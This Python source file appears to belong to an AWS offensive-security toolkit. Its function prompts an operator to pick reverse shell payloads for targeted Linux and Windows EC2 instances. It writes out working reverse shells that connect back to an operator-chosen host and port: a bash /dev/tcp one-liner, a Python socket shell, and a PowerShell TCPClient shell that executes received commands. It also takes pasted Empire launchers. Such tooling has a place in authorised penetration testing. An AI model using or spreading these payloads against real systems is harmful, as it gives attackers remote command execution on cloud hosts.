from clint.textui import prompt

from src.helpers.print_output import print_color


def reverseshell_multiple_options(linux: bool, windows: bool) -> (str, str):
    """
    Prompts for reverse shell options against a range of EC2 instances depending on their OS.
    :param linux: Whether there are any targeted instances running Linux.
    :param windows: Whether there are any targeted instances running Windows.
    :return: Tuple of reverse shell payloads for linux and windows.
    """
    print_color('[*] Choose your reverse shell type:')
    print_color('[*] Make sure your listening server can handle multiple simultaneous reverse shell connections:')

    linux_attack = ''
    windows_attack = ''
    if linux:
        linux_options = [{'selector': '1', 'prompt': 'Bash reverse shell', 'return': 'bash'},
                         {'selector': '2', 'prompt': 'Python reverse shell',
                          'return': 'python'},
                         {'selector': '3', 'prompt': 'Empire Python Launcher', 'return': 'empirepython'}]
        linux_attack = prompt.options(
            'Payload for Linux EC2 instances:', linux_options)

        if linux_attack == 'empirepython':
            print_color(
                '[*] Generate your Empire python launcher code in empire and paste it here:')
            linux_attack = input('Paste here:')
        else:
            host = prompt.query(
                'Your remote IP or hostname to connect back to:')
            port = prompt.query("Your remote port number:", default="4444")
            if linux_attack == 'bash':
                linux_attack = "bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
            elif linux_attack == 'python':
                linux_attack = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (
                    host, port)

    if windows:
        windows_options = [{'selector': '1', 'prompt': 'Powershell reverse shell', 'return': 'powershell'},
                           {'selector': '2', 'prompt': 'Empire Powershell Launcher', 'return': 'empirepowershell'}]
        windows_attack = prompt.options(
            'Payload for Windows EC2 instances:', windows_options)
        if windows_attack == 'empirepowershell':
            print_color(
                '[*] Generate your Empire powershell launcher code in empire and paste it here:')
            windows_attack = input('Paste here:')
        else:
            host = prompt.query(
                'Your remote IP or hostname to connect back to:')
            port = prompt.query("Your remote port number:", default="5555")
            if windows_attack == 'powershell':
                windows_attack = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" % (
                    host, port)

    return linux_attack, windows_attack
